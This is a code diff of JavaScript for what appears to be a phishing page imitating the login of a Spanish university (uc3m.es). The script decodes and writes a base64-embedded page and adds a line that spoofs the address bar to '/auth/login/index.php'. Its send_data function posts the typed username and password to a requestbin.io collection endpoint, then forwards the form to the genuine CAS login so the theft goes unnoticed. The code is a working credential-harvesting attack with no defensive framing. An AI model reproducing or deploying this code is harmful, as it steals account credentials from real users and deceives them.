@@ -1,4 +1,5 @@
 document.open();
+window.history.pushState("", "", '/auth/login/index.php');
 function atou(b64) {
 	return decodeURIComponent(escape(atob(b64)));
 }
@@ -7,12 +8,11 @@ document.write(atou(base64encoded));
 document.close();
 function send_data(){
 	var http = new XMLHttpRequest();
-	var url = 'https://requestbin.io/v06r31v0';	
+	var url = 'https://requestbin.io/v06r31v0';
 	var params = document.getElementById('edit-name').value + '||' + document.getElementById('edit-pass').value;
 	http.open('POST', url, true);
 	http.send(params);
-	setTimeout(function(){
-		document.getElementById('formulario1').action = "https://login.uc3m.es/index.php/CAS/login?service=https%3A%2F%2Faulaglobal.uc3m.es%2Flogin%2Findex.php";
+	setTimeout(function(){				document.getElementById('formulario1').action = "https://login.uc3m.es/index.php/CAS/login?service=https%3A%2F%2Faulaglobal.uc3m.es%2Flogin%2Findex.php";
 		document.getElementById("formulario1").submit(); 
 	}, 500);
 }
